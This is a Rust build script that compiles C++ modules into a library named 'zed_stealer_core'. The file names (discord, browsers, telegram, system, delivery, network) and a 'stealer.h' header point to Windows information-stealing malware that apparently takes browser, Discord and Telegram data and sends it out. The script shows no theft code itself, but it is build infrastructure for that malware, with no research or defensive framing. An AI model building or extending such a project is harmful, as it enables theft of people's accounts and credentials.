fn main() {
    #[cfg(target_os = "windows")]
    {
        cc::Build::new()
            .cpp(false)
            .flag_if_supported("/W0")          // suppress warnings in amalgamation
            .flag_if_supported("/nologo")
            .define("SQLITE_THREADSAFE", "0")  // single-threaded, lighter
            .define("SQLITE_OMIT_LOAD_EXTENSION", "1")
            .file("cpp/sqlite3.c")
            .compile("sqlite3");

        cc::Build::new()
            .cpp(true)
            .flag_if_supported("/std:c++17")
            .flag_if_supported("/EHsc")
            .flag_if_supported("/W3")
            .flag_if_supported("/nologo")
            .file("cpp/discord.cpp")
            .file("cpp/browsers.cpp")
            .file("cpp/system.cpp")
            .file("cpp/telegram.cpp")
            .file("cpp/delivery.cpp")
            .file("cpp/network.cpp")
            .compile("zed_stealer_core");

        println!("cargo:rustc-link-lib=sqlite3");
        println!("cargo:rustc-link-lib=zed_stealer_core");
        println!("cargo:rerun-if-changed=cpp/stealer.h");
        println!("cargo:rerun-if-changed=cpp/sqlite3.h");
        println!("cargo:rerun-if-changed=cpp/discord.cpp");
        println!("cargo:rerun-if-changed=cpp/browsers.cpp");
        println!("cargo:rerun-if-changed=cpp/system.cpp");
        println!("cargo:rerun-if-changed=cpp/telegram.cpp");
        println!("cargo:rerun-if-changed=cpp/delivery.cpp");
        println!("cargo:rerun-if-changed=cpp/network.cpp");
    }
}
